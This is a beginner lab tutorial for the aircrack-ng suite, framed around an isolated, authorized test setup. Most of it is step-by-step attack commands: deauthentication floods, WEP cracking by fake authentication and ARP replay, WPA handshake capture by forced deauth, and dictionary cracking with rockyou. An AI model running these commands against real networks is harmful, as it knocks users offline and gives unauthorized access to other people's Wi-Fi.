# Aircrack-ng Beginner Laboratory

**Objective**: Learn the fundamentals of wireless security testing using aircrack-ng suite through hands-on exercises in a controlled environment.

---

## 🎯 Lab Prerequisites

### **Hardware Requirements**
- Wireless USB adapter with monitor mode support
- Dedicated wireless router for testing
- Linux machine (Kali Linux recommended)
- Target devices (phones, laptops) for testing

### **Software Setup**
```bash
# Verify aircrack-ng installation
aircrack-ng --version

# Update OUI database
sudo airodump-ng-oui-update

# Check wireless interfaces
iwconfig

# Install additional tools
sudo apt install -y macchanger
```

### **Lab Environment**
- Isolated network (no internet connectivity)
- Dedicated testing hardware
- Proper authorization documentation
- Secure data handling procedures

---

## 📚 Phase 1: Interface Management

### **Exercise 1.1: Monitor Mode Basics**

**Objective**: Master wireless interface management and monitor mode configuration.

```bash
# Step 1: Check available interfaces
iwconfig

# Step 2: List all wireless interfaces
airmon-ng

# Step 3: Check for interfering processes
airmon-ng check

# Step 4: Kill conflicting processes
sudo airmon-ng check kill

# Step 5: Start monitor mode
sudo airmon-ng start wlan0

# Step 6: Verify monitor mode
iwconfig wlan0mon
```

**Expected Output**:
```
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Access Point: Not-Associated
```

### **Exercise 1.2: Interface Troubleshooting**

**Objective**: Learn to troubleshoot common interface issues.

```bash
# Test different interface configurations
sudo airmon-ng start wlan0 6  # Start on channel 6
sudo airmon-ng start wlan0 6 00:11:22:33:44:55  # Custom MAC

# Check interface status
ip link show wlan0mon
iwconfig wlan0mon

# Reset interface if needed
sudo ifconfig wlan0mon down
sudo ifconfig wlan0mon up
```

**Analysis Questions**:
1. What happens when you start monitor mode twice?
2. How do you identify the monitor interface name?
3. What processes commonly conflict with monitor mode?

---

## 🔍 Phase 2: Network Discovery

### **Exercise 2.1: Basic Network Scanning**

**Objective**: Discover wireless networks and analyze their characteristics.

```bash
# Step 1: Start comprehensive scan
sudo airodump-ng wlan0mon

# Step 2: Target specific channel
sudo airodump-ng -c 6 wlan0mon

# Step 3: Save scan results
sudo airodump-ng -w discovery_scan wlan0mon

# Step 4: Generate CSV output
sudo airodump-ng -w discovery_scan --output-format csv wlan0mon
```

**Data Analysis**:
```bash
# Examine saved files
ls -la discovery_scan*

# Analyze CSV data
head -20 discovery_scan-01.csv

# Count networks by encryption type
grep -c "WEP\|WPA\|WPA2" discovery_scan-01.csv
```

### **Exercise 2.2: Targeted Network Analysis**

**Objective**: Focus on specific networks and analyze client behavior.

```bash
# Target specific BSSID
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0mon

# Show beacon frames
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 --beacons wlan0mon

# Monitor with manufacturer info
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -M wlan0mon

# Save targeted capture
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w target_capture wlan0mon
```

**Lab Report Template**:
```
Network Analysis Report
======================
BSSID: [MAC Address]
ESSID: [Network Name]
Channel: [Channel Number]
Encryption: [WEP/WPA/WPA2]
Signal Strength: [dBm]
Connected Clients: [Count]
Observations: [Notes]
```

---

## 🎯 Phase 3: Packet Injection

### **Exercise 3.1: Injection Testing**

**Objective**: Test packet injection capabilities and understand wireless card limitations.

```bash
# Test basic injection
sudo aireplay-ng -9 wlan0mon

# Test injection to specific AP
sudo aireplay-ng -9 -a 00:11:22:33:44:55 wlan0mon

# Test different injection modes
sudo aireplay-ng -9 -i wlan0mon wlan0mon
```

**Expected Results**:
```
Injection is working!
Found 1 AP:
[MAC Address] [ESSID] (Channel 6)
```

### **Exercise 3.2: Basic Deauthentication**

**Objective**: Learn client manipulation through deauthentication attacks.

```bash
# Deauthenticate all clients (5 packets)
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# Deauthenticate specific client
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

# Continuous deauthentication
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
```

**Monitoring Setup**:
```bash
# Terminal 1: Monitor target network
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan0mon

# Terminal 2: Perform deauth attack
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon
```

---

## 🔓 Phase 4: WEP Cracking

### **Exercise 4.1: WEP Network Setup**

**Objective**: Configure a WEP network for testing purposes.

**Router Configuration**:
```
SSID: TestWEP
Security: WEP
Key: 1234567890 (40-bit)
Channel: 6
```

### **Exercise 4.2: Basic WEP Attack**

**Objective**: Perform a complete WEP cracking attack.

```bash
# Step 1: Start monitoring
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# Step 2: Fake authentication (new terminal)
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# Step 3: ARP request replay (new terminal)
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# Step 4: Monitor data collection
# Watch for increasing #Data packets in airodump-ng

# Step 5: Crack the key (new terminal)
aircrack-ng wep_capture.cap
```

**Success Indicators**:
- Fake authentication: "Association successful"
- ARP replay: "Sent [number] packets"
- Data collection: "#Data" count increasing
- Key recovery: "KEY FOUND!"

---

## 🔐 Phase 5: WPA/WPA2 Basics

### **Exercise 5.1: Handshake Capture**

**Objective**: Capture WPA/WPA2 handshake for password cracking.

```bash
# Step 1: Monitor target network
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake_capture wlan0mon

# Step 2: Wait for client connection or force reconnection
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon

# Step 3: Verify handshake capture
# Look for "WPA handshake" message in airodump-ng
```

### **Exercise 5.2: Basic Password Cracking**

**Objective**: Crack WPA/WPA2 passwords using dictionary attacks.

```bash
# Create simple wordlist
echo "password123" > simple_wordlist.txt
echo "admin" >> simple_wordlist.txt
echo "12345678" >> simple_wordlist.txt

# Crack with wordlist
aircrack-ng -w simple_wordlist.txt handshake_capture.cap

# Use larger wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake_capture.cap
```

---

## 📊 Phase 6: Results Analysis

### **Exercise 6.1: Capture File Analysis**

**Objective**: Analyze captured data and understand wireless traffic patterns.

```bash
# Check capture files
ls -la *.cap

# Analyze captured networks
aircrack-ng discovery_scan.cap

# Extract specific information
strings discovery_scan.cap | grep -i essid

# Count packets by type
tcpdump -r discovery_scan.cap | head -20
```

### **Exercise 6.2: Success Rate Analysis**

**Objective**: Evaluate attack success rates and identify improvement areas.

```bash
# Test results template
cat > attack_results.txt << 'EOF'
WEP Attack Results:
- Time to crack: [X] minutes
- Data packets needed: [X]
- Success rate: [X]%

WPA Attack Results:
- Handshake capture time: [X] seconds
- Dictionary size: [X] words
- Crack time: [X] minutes
- Success: [Yes/No]
EOF
```

---

## 🛡️ Phase 7: Security Considerations

### **Exercise 7.1: Ethical Testing**

**Objective**: Understand legal and ethical implications of wireless testing.

**Checklist**:
- [ ] Written authorization obtained
- [ ] Testing scope clearly defined
- [ ] Isolated lab environment used
- [ ] Data handling procedures followed
- [ ] Results documented properly

### **Exercise 7.2: Defensive Measures**

**Objective**: Understand how to protect against discovered attacks.

**Recommendations**:
```bash
# Change default passwords
# Use WPA3 when available
# Implement MAC filtering
# Enable wireless intrusion detection
# Regular security audits
```

---

## 🎓 Lab Completion

### **Skills Demonstrated**
- [x] Monitor mode configuration
- [x] Wireless network discovery
- [x] Packet injection testing
- [x] WEP network cracking
- [x] WPA handshake capture
- [x] Dictionary password attacks
- [x] Results analysis and reporting

### **Next Steps**
1. Complete [Intermediate Lab](../intermediate_lab.md)
2. Practice with different network configurations
3. Develop custom wordlists
4. Learn advanced evasion techniques

---

## 🔍 Troubleshooting Guide

### **Common Issues**

**Monitor Mode Fails**:
```bash
# Solution 1: Kill conflicting processes
sudo airmon-ng check kill

# Solution 2: Restart networking
sudo systemctl restart networking

# Solution 3: Reload driver
sudo modprobe -r rtl8812au
sudo modprobe rtl8812au
```

**Injection Not Working**:
```bash
# Check injection capability
sudo aireplay-ng -9 wlan0mon

# Verify interface is in monitor mode
iwconfig wlan0mon

# Check for hardware limitations
dmesg | grep -i wireless
```

**No Handshake Captured**:
```bash
# Increase deauth packet count
sudo aireplay-ng -0 10 -a [BSSID] wlan0mon

# Try different timing
sudo aireplay-ng -0 5 -a [BSSID] --delay 500 wlan0mon

# Verify client is connected
# Check airodump-ng client list
```

---

## 📚 Additional Resources

### **Practice Networks**
- Set up multiple test APs with different security
- Use old routers with WEP for practice
- Create mixed security environments

### **Wordlist Sources**
- `/usr/share/wordlists/rockyou.txt`
- SecLists password collections
- Custom wordlist generators

### **Documentation**
- Keep detailed lab notes
- Document all commands used
- Record success/failure rates
- Note timing and performance

---

*Beginner Lab Complete - Ready for Intermediate Challenges*
